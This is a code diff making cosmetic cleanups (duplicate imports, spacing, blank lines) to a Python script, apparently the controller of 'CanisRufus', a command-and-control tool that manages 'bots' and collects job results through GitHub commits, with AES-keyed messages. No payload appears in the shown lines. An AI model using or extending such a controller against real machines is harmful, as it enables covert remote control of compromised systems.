@@ -41,21 +41,18 @@ import hashlib
 import time
 
 from pygithub3 import Github
-from pygithub3.services.repos import Commits
 from base64 import b64decode
 from argparse import RawTextHelpFormatter
 from Crypto.Cipher import AES
 from Crypto import Random
-from pygithub3 import Github
 
 ######################################################
 
-
-############################################
 myrepo = 'my_repository'
 username = 'my_username'
 access_token = 'my_api_token'
 AESKey = 'my_AES_key'
+
 ############################################
 
 def generateJobID():
@@ -186,7 +183,7 @@ class CanisRufus:
 
     def checkBots(self):
         bots = []        
-        commits=[]
+        commits = []
         commits = self.gh.repos.commits.list().all()
         
         for c in commits:
@@ -245,13 +242,12 @@ class CanisRufus:
                 
                 break
             
-            
     def getJobResults(self, botid, jobid):
 
         if (jobid is None):
             sys.exit("[-] You must specify a client id (-id) and a jobid (-job-id)")
 
-        commits=[]
+        commits = []
         commits = self.gh.repos.commits.list().all()
 
         for c in commits:
@@ -297,9 +293,7 @@ class CanisRufus:
 
 if __name__ == '__main__':
 
-    parser = argparse.ArgumentParser(description="""      
-    
-    
+    parser = argparse.ArgumentParser(description="""
  _____             _     ______       __           
 /  __ \           (_)    | ___ \     / _|          
 | /  \/ __ _ _ __  _ ___ | |_/ /   _| |_ _   _ ___ 
@@ -307,9 +301,6 @@ if __name__ == '__main__':
 | \__/\ (_| | | | | \__ \| |\ \ |_| | | | |_| \__ \\
  \____/\__,_|_| |_|_|___/\_| \_\__,_|_|  \__,_|___/
                                                    
-                                                   
-      
-
 """,                                 
                                      version='1.0.0',
                                      formatter_class=RawTextHelpFormatter)
@@ -426,4 +417,3 @@ if __name__ == '__main__':
 
     elif args.jobid:
         canisrufus.getJobResults(args.id, args.jobid)
-                
